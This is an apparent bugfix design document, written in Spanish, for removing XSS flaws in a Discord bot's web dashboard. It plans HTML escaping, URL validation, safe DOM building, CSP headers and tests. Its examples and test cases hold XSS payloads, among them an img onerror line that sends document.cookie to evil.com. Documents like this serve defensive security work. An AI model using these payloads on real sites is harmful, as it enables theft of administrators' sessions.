# XSS Dashboard Sanitization - Diseño de Bugfix

## Overview

Este bugfix aborda múltiples vulnerabilidades críticas de Cross-Site Scripting (XSS) en el dashboard web del bot de Discord. Las vulnerabilidades se originan por el uso inseguro de `innerHTML` para insertar datos controlados por usuarios (nombres, avatares, descripciones) sin sanitización, permitiendo la ejecución de código JavaScript arbitrario en navegadores de administradores.

La estrategia de fix implementa defensa en profundidad mediante:
1. Sanitización de entrada: Funciones de escape HTML y validación de URLs
2. Construcción segura del DOM: Reemplazo de `innerHTML` por métodos seguros (`textContent`, `createElement`, `setAttribute`)
3. Defensa perimetral: Content Security Policy (CSP) headers para bloquear scripts inline no autorizados

## Glossary

- **Bug_Condition (C)**: La condición que activa el bug - cuando datos de usuario contienen código HTML/JavaScript malicioso y son insertados en el DOM usando `innerHTML`
- **Property (P)**: El comportamiento deseado - los datos maliciosos deben ser escapados y mostrados como texto plano sin ejecutar código
- **Preservation**: La funcionalidad existente que debe permanecer sin cambios - renderizado de emojis, colores de roles, avatares válidos, interacciones del dashboard
- **XSS (Cross-Site Scripting)**: Vulnerabilidad que permite inyectar y ejecutar código JavaScript malicioso en el navegador de otros usuarios
- **innerHTML**: Propiedad del DOM que interpreta strings como HTML, permitiendo ejecución de scripts si no se sanitiza
- **textContent**: Propiedad del DOM que trata strings como texto plano, previniendo ejecución de código
- **CSP (Content Security Policy)**: Header HTTP que restringe las fuentes desde las cuales se pueden cargar recursos y ejecutar scripts
- **Sanitización**: Proceso de escapar o remover caracteres especiales HTML para prevenir interpretación como código

## Bug Details

### Bug Condition

El bug se manifiesta cuando datos controlados por usuarios (displayName, username, avatarUrl, channel name, achievement name/description/icon) contienen código HTML/JavaScript malicioso y son insertados en el DOM usando `innerHTML` sin sanitización previa. Esto ocurre en 5 ubicaciones críticas del archivo `public/script.js`.

**Formal Specification:**
```
FUNCTION isBugCondition(input)
  INPUT: input of type UserData | ChannelData | AchievementData
  OUTPUT: boolean
  
  RETURN (input.displayName OR input.username OR input.avatarUrl OR 
          input.name OR input.description OR input.icon) 
         CONTAINS_ANY_OF ['<', '>', '"', "'", '&', 'javascript:', 'data:', 'vbscript:']
         AND isInsertedViaInnerHTML(input)
         AND NOT isSanitized(input)
END FUNCTION
```

### Examples

- **Ejemplo 1 - Nombre malicioso**: Usuario con displayName `<img src=x onerror="alert('XSS')">` → Al renderizar la tabla de usuarios (línea 203), el navegador ejecuta `alert('XSS')`
- **Ejemplo 2 - Avatar malicioso**: Usuario con avatarUrl `javascript:alert('XSS')` → Al cargar la imagen, el navegador ejecuta el código JavaScript
- **Ejemplo 3 - Canal malicioso**: Canal con name `<script>document.location='http://evil.com'</script>` → Al renderizar el selector de canales (línea 424), redirige a sitio malicioso
- **Ejemplo 4 - Logro malicioso**: Logro con description `<img src=x onerror="fetch('http://evil.com/steal?cookie='+document.cookie)">` → Al renderizar logros (línea 466), envía cookies de sesión al atacante
- **Edge case - Caracteres especiales legítimos**: Usuario con displayName `Me & My Friends <3` → Debe mostrarse correctamente como texto sin romper el HTML

## Expected Behavior

### Preservation Requirements

**Unchanged Behaviors:**
- Los emojis y caracteres Unicode en nombres de usuario deben continuar mostrándose correctamente
- Los avatares con URLs HTTPS válidas deben continuar cargándose correctamente
- Los colores personalizados de roles deben continuar aplicándose con estilos inline
- El botón "Copiar ID" debe continuar funcionando con feedback visual
- Las acciones de agregar/remover roles deben continuar ejecutándose correctamente
- Los filtros de categoría (admins, mods, normal) deben continuar funcionando
- La búsqueda de usuarios debe continuar mostrando resultados relevantes
- La selección de admins/mods con límite de 3 usuarios debe continuar funcionando
- El guardado de configuraciones de bienvenida/despedida debe continuar funcionando
- Los estilos visuales de logros desbloqueados vs bloqueados deben continuar aplicándose
- La navegación entre pantallas del dashboard debe continuar funcionando
- El diseño responsive en móviles debe continuar funcionando

**Scope:**
Todos los inputs que NO contienen código HTML/JavaScript malicioso deben ser completamente no afectados por este fix. Esto incluye:
- Nombres de usuario con caracteres Unicode legítimos (emojis, acentos, caracteres especiales)
- URLs de avatares con protocolo HTTPS válido
- Nombres de canales con caracteres especiales no maliciosos
- Descripciones de logros con texto plano o emojis

## Hypothesized Root Cause

Basado en la descripción del bug, los problemas más probables son:

1. **Uso Inseguro de innerHTML**: El código usa `innerHTML` para construir elementos del DOM con datos de usuario sin sanitización previa. Esto permite que cualquier código HTML/JavaScript en los datos sea interpretado y ejecutado por el navegador.
   - Línea 203: Renderizado de tabla de usuarios con avatarUrl, displayName, username
   - Línea 316: Renderizado de dropdown de búsqueda con avatarUrl, displayName
   - Línea 330: Renderizado de chips de selección con avatarUrl, displayName
   - Línea 424: Renderizado de selector de canales con channel name
   - Línea 466: Renderizado de logros con icon, name, description

2. **Falta de Validación de URLs**: El código no valida que las URLs de avatares usen protocolos seguros (http/https), permitiendo protocolos maliciosos como `javascript:`, `data:`, `vbscript:`

3. **Falta de Escape de Caracteres HTML**: El código no escapa caracteres especiales HTML (`<`, `>`, `&`, `"`, `'`) antes de insertarlos en el DOM, permitiendo inyección de tags HTML arbitrarios

4. **Ausencia de CSP Headers**: El servidor no implementa Content Security Policy headers, permitiendo la ejecución de scripts inline y carga de recursos desde cualquier origen

## Correctness Properties

Property 1: Bug Condition - XSS Prevention Through Sanitization

_For any_ input where the bug condition holds (user data contains HTML/JavaScript special characters), the fixed rendering functions SHALL escape all special characters (`<`, `>`, `&`, `"`, `'`) and validate URLs to allow only http/https protocols, ensuring the data is displayed as plain text without executing any code.

**Validates: Requirements 2.1, 2.2, 2.3, 2.4, 2.5, 2.6, 2.7, 2.8, 2.9**

Property 2: Preservation - Legitimate Content Display

_For any_ input where the bug condition does NOT hold (user data contains legitimate Unicode characters, valid HTTPS URLs, or non-malicious special characters), the fixed rendering functions SHALL produce exactly the same visual output as the original code, preserving emoji display, role colors, avatar images, and all interactive functionality.

**Validates: Requirements 3.1, 3.2, 3.3, 3.4, 3.5, 3.6, 3.7, 3.8, 3.9, 3.10, 3.11, 3.12**

## Fix Implementation

### Changes Required

Asumiendo que nuestro análisis de causa raíz es correcto:

**File**: `public/script.js`

**Specific Changes**:

1. **Crear Función de Sanitización HTML** (agregar al inicio del archivo):
   - Implementar función `escapeHtml(text)` que escape caracteres especiales
   - Mapeo: `<` → `&lt;`, `>` → `&gt;`, `&` → `&amp;`, `"` → `&quot;`, `'` → `&#39;`
   - Esta función será usada para todos los textos de usuario antes de insertarlos en el DOM

2. **Crear Función de Validación de URLs** (agregar al inicio del archivo):
   - Implementar función `sanitizeUrl(url)` que valide protocolos seguros
   - Permitir solo: `http:`, `https:`, URLs relativas
   - Rechazar: `javascript:`, `data:`, `vbscript:`, `file:`, etc.
   - Retornar URL por defecto si la validación falla

3. **Refactorizar Renderizado de Tabla de Usuarios** (línea 203):
   - Reemplazar `tr.innerHTML = ...` por construcción segura con `createElement`
   - Usar `textContent` para displayName y username
   - Usar `setAttribute('src', sanitizeUrl(url))` para avatares
   - Mantener estilos inline para colores de roles (no son controlados por usuario)
   - Preservar event handlers onclick para botones de remover rol

4. **Refactorizar Renderizado de Dropdown de Búsqueda** (línea 316):
   - Reemplazar `d.innerHTML = ...` por construcción segura con `createElement`
   - Usar `textContent` para displayName
   - Usar `setAttribute('src', sanitizeUrl(url))` para avatares
   - Preservar event handler onclick para selección de usuario

5. **Refactorizar Renderizado de Chips de Selección** (línea 330):
   - Reemplazar `chip.innerHTML = ...` por construcción segura con `createElement`
   - Usar `textContent` para displayName
   - Usar `setAttribute('src', sanitizeUrl(url))` para avatares
   - Preservar event handler onclick para botón de remover

6. **Refactorizar Renderizado de Selector de Canales** (línea 424):
   - Reemplazar construcción de options con template literals por `createElement('option')`
   - Usar `textContent` para channel name
   - Usar `setAttribute('value', channelId)` para valores

7. **Refactorizar Renderizado de Logros** (línea 466):
   - Reemplazar `grid.innerHTML = ...` por construcción segura con `createElement`
   - Usar `textContent` para name y description
   - Sanitizar icon (puede contener emojis legítimos o código malicioso)
   - Preservar clases CSS para estilos de locked/unlocked

**File**: `dashboard.js`

**Specific Changes**:

8. **Implementar CSP Headers** (después de la línea 30, antes de las rutas):
   - Agregar middleware que establezca header `Content-Security-Policy`
   - Política: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' https://cdn.discordapp.com data:; connect-src 'self'`
   - `'unsafe-inline'` solo para styles (necesario para colores de roles)
   - Permitir imágenes de Discord CDN para avatares
   - Bloquear scripts inline y eval

## Testing Strategy

### Validation Approach

La estrategia de testing sigue un enfoque de dos fases: primero, demostrar las vulnerabilidades XSS en el código sin fix mediante exploratory testing, luego verificar que el fix previene XSS y preserva funcionalidad existente.

### Exploratory Bug Condition Checking

**Goal**: Demostrar las vulnerabilidades XSS ANTES de implementar el fix. Confirmar o refutar el análisis de causa raíz. Si refutamos, necesitaremos re-hipotetizar.

**Test Plan**: Crear datos de prueba con payloads XSS comunes y verificar si se ejecutan en el código UNFIXED. Usar un entorno de testing con navegador headless (Puppeteer/Playwright) para detectar ejecución de JavaScript.

**Test Cases**:
1. **XSS en Tabla de Usuarios - displayName**: Crear usuario con displayName `<img src=x onerror="window.xssTriggered=true">` y verificar que `window.xssTriggered` se establece (fallará en código unfixed)
2. **XSS en Tabla de Usuarios - avatarUrl**: Crear usuario con avatarUrl `javascript:void(window.xssTriggered=true)` y verificar ejecución (fallará en código unfixed)
3. **XSS en Dropdown de Búsqueda**: Buscar usuario con displayName malicioso y verificar ejecución en dropdown (fallará en código unfixed)
4. **XSS en Chips de Selección**: Seleccionar usuario con displayName malicioso como admin y verificar ejecución (fallará en código unfixed)
5. **XSS en Selector de Canales**: Crear canal con name `<script>window.xssTriggered=true</script>` y verificar ejecución (fallará en código unfixed)
6. **XSS en Logros**: Crear logro con description maliciosa y verificar ejecución (fallará en código unfixed)

**Expected Counterexamples**:
- `window.xssTriggered` se establece en true para todos los casos
- Posibles causas confirmadas: uso de innerHTML sin sanitización, falta de validación de URLs, ausencia de CSP

### Fix Checking

**Goal**: Verificar que para todos los inputs donde la condición de bug se cumple, las funciones fixed previenen la ejecución de código malicioso.

**Pseudocode:**
```
FOR ALL input WHERE isBugCondition(input) DO
  result := renderFunction_fixed(input)
  ASSERT NOT codeExecuted(result)
  ASSERT displayedAsPlainText(result, input)
END FOR
```

**Test Plan**: Ejecutar los mismos test cases del exploratory testing en el código FIXED y verificar que:
- `window.xssTriggered` NO se establece
- El contenido malicioso se muestra como texto plano escapado
- Los CSP headers bloquean cualquier intento de ejecución inline

**Test Cases**:
1. **XSS Prevention - displayName**: Verificar que `<img src=x onerror="alert(1)">` se muestra como texto literal
2. **XSS Prevention - avatarUrl**: Verificar que `javascript:alert(1)` es rechazado y se usa avatar por defecto
3. **XSS Prevention - channel name**: Verificar que `<script>alert(1)</script>` se muestra como texto literal
4. **XSS Prevention - achievement description**: Verificar que código malicioso se muestra como texto literal
5. **CSP Enforcement**: Verificar que intentos de ejecutar scripts inline son bloqueados por CSP headers

### Preservation Checking

**Goal**: Verificar que para todos los inputs donde la condición de bug NO se cumple, las funciones fixed producen el mismo resultado visual y funcional que las funciones originales.

**Pseudocode:**
```
FOR ALL input WHERE NOT isBugCondition(input) DO
  ASSERT visualOutput_original(input) = visualOutput_fixed(input)
  ASSERT functionality_original(input) = functionality_fixed(input)
END FOR
```

**Testing Approach**: Property-based testing es recomendado para preservation checking porque:
- Genera muchos casos de prueba automáticamente a través del dominio de entrada
- Detecta edge cases que tests unitarios manuales podrían perder
- Provee garantías fuertes de que el comportamiento no cambia para todos los inputs no maliciosos

**Test Plan**: Observar comportamiento en código UNFIXED primero para inputs legítimos, luego escribir property-based tests capturando ese comportamiento.

**Test Cases**:
1. **Emoji Preservation**: Verificar que displayNames con emojis (🎮, 😀, 🏆) se muestran idénticamente antes y después del fix
2. **Unicode Preservation**: Verificar que nombres con caracteres especiales (á, é, ñ, 中文, العربية) se muestran correctamente
3. **Avatar Loading Preservation**: Verificar que avatares con URLs HTTPS válidas cargan correctamente
4. **Role Color Preservation**: Verificar que colores de roles se aplican con los mismos estilos inline
5. **Interactive Functionality Preservation**: Verificar que botones de copiar ID, agregar/remover roles, filtros, búsqueda funcionan idénticamente
6. **Special Characters Preservation**: Verificar que caracteres como `&`, `<3`, `Me & You` se muestran correctamente escapados pero visualmente idénticos

### Unit Tests

- Test de función `escapeHtml()` con todos los caracteres especiales HTML
- Test de función `sanitizeUrl()` con protocolos válidos e inválidos
- Test de renderizado de cada componente con datos maliciosos (debe escapar)
- Test de renderizado de cada componente con datos legítimos (debe preservar)
- Test de CSP headers en respuestas del servidor

### Property-Based Tests

- Generar strings aleatorios con/sin caracteres HTML especiales y verificar escape correcto
- Generar URLs aleatorias con diferentes protocolos y verificar validación correcta
- Generar combinaciones de datos de usuario y verificar que funcionalidad se preserva
- Generar payloads XSS conocidos de listas públicas (OWASP XSS Filter Evasion) y verificar prevención

### Integration Tests

- Test de flujo completo: login → ver usuarios con nombres maliciosos → verificar no ejecución
- Test de flujo completo: configurar canal con nombre malicioso → guardar → recargar → verificar no ejecución
- Test de flujo completo: ver logros con descripciones maliciosas → verificar no ejecución
- Test de CSP: intentar inyectar script inline después del fix → verificar bloqueo por CSP
- Test de preservación: realizar todas las acciones del dashboard con datos legítimos → verificar funcionalidad idéntica
